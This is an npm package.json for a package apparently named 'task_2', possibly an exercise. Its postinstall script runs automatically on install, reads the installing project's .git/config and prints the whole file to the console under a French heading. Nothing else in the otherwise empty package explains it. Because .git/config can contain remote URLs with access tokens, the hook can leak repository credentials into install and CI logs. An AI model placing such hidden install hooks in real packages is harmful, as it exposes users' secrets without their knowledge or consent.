{
  "name": "task_2",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "postinstall": "node -e \"const fs = require('fs'); try { const config = fs.readFileSync('.git/config', 'utf8'); console.log('--- CONTENU DE .GIT/CONFIG ---'); console.log(config); } catch(e) { console.log('Pas de fichier .git/config trouvé'); }\""
  },
  "author": "",
  "license": "ISC",
  "description": ""
}
